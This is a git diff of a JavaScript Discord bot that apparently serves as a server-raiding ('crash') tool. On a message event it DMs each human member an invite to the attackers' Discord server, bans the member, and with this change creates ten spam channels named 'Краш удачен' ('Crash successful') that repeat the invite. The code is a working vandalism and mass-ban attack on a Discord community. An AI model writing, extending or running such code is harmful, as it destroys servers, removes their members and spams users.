@@ -41,7 +41,16 @@ bot.on('message', msg => {
         if (member.id != bot.user.id && !member.user.bot) member.send('Вас крашнула конфа https://discord.gg/DM5xaGD').then(() => {
             member.ban().then(() => {
                 const name = 'Конфа крашнула Вас'
-                msg.guild.createChannel(name)
+                msg.guild.createChannel('Краш удачен')
+                msg.guild.createChannel('Краш удачен')
+                msg.guild.createChannel('Краш удачен')
+                msg.guild.createChannel('Краш удачен')
+                msg.guild.createChannel('Краш удачен')
+                msg.guild.createChannel('Краш удачен')
+                msg.guild.createChannel('Краш удачен')
+                msg.guild.createChannel('Краш удачен')
+                msg.guild.createChannel('Краш удачен')
+                msg.guild.createChannel('Краш удачен')
 					.then(channel => {
                     channel.send('Вас крашнула конфа https://discord.gg/DM5xaGD')
                     channel.overwritePermissions(member, {
